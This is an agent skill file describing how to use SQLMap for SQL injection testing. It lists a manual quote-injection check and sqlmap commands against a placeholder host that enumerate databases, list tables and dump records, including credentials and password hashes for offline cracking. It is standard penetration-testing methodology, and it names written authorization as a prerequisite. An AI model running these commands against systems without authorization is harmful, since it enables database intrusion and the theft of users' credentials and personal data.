---
name: sqlmap-database-penetration-testing
description: Use this skill when you need to automate SQL injection testing, enumerate database structures, extract database credentials, or perform automated database penetration testing using SQLMap.
---

# SQLMap Database Penetration Testing

## Purpose

Provide systematic methodologies for automated SQL injection detection and exploitation using SQLMap. This skill covers database enumeration, table and column discovery, data extraction, multiple target specification methods, and advanced exploitation techniques for various database management systems.

## Inputs / Prerequisites

- **Target URL**: Web application URL with injectable parameter (e.g., `?id=1`)
- **SQLMap Installation**: Pre-installed on Kali Linux or downloaded from GitHub
- **Verified Injection Point**: URL parameter confirmed or suspected to be SQL injectable
- **Request File (Optional)**: Burp Suite captured HTTP request for POST-based injection
- **Authorization**: Written permission for penetration testing activities

## Outputs / Deliverables

- **Database Enumeration**: List of all databases on the target server
- **Table Structure**: Complete table names within target database
- **Column Mapping**: Column names and data types for each table
- **Extracted Data**: Dumped records including usernames, passwords, and sensitive data
- **Hash Values**: Password hashes for offline cracking
- **Vulnerability Report**: Confirmation of SQL injection type and severity

## Core Workflow

### 1. Identify SQL Injection Vulnerability

#### Manual Verification
```bash
# Add single quote to break query
http://target.com/page.php?id=1'

# If error message appears, likely SQL injectable
# Error example: "You have an error in your SQL syntax"
```

#### Initial SQLMap Scan
```bash
# Basic vulnerability detection
sqlmap -u "http://target.com/page.php?id=1" --batch

# With verbosity for detailed output
sqlmap -u "http://target.com/page.php?id=1" --batch -v 3
```

### 2. Enumerate Databases

#### List All Databases
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

**Key Options:**
- `-u`: Target URL with injectable parameter
- `--dbs`: Enumerate database names
- `--batch`: Use default answers (non-interactive mode)

### 3. Extract Data

#### Dump Tables and Columns
```bash
sqlmap -u "http://target.com/page.php?id=1" --tables -D <database_name> --batch
sqlmap -u "http://target.com/page.php?id=1" --dump -D <database_name> -T <table_name> --batch
```

### 4. Generate Vulnerability Report

- Compile findings into a report detailing the SQL injection type, affected databases, and extracted data.

## Notes

- Always ensure you have proper authorization before conducting penetration testing.
- Use SQLMap responsibly and ethically.